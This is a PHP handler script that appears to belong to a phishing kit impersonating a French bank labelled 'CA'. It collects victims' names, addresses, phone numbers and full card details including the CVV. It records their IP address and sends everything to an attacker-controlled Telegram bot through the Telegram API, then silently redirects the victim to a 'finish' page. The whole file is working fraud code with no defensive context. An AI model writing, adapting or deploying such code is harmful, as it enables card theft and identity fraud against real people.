<?php

session_start();

include "../../email.php";


$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 CA fullz 🔥】━━━━[+]\r\n";
$message .= 'nom               :  ' . $_POST['nom'] . "\r\n";
$message .= 'prenom              :  ' . $_POST['prenom'] . "\r\n";
$message .= 'address             :  ' . $_POST['address'] . "\r\n";
$message .= 'Telephone          :  ' . $_POST['phone'] . "\r\n";
$message .= 'zip_code            :  ' . $_POST['zip_code'] . "\r\n";
$message .= 'city                :  ' . $_POST['city'] . "\r\n";
$message .= 'N° de carte         :  ' . $_POST['cc_number'] . "\r\n";
$message .= 'Date d\'expiration  :  ' . $_POST['cc_date'] . "\r\n";
$message .= 'Cvv :  ' . $_POST['cc_cvv'] . "\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 CA Bank  🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../finish.php");


?>

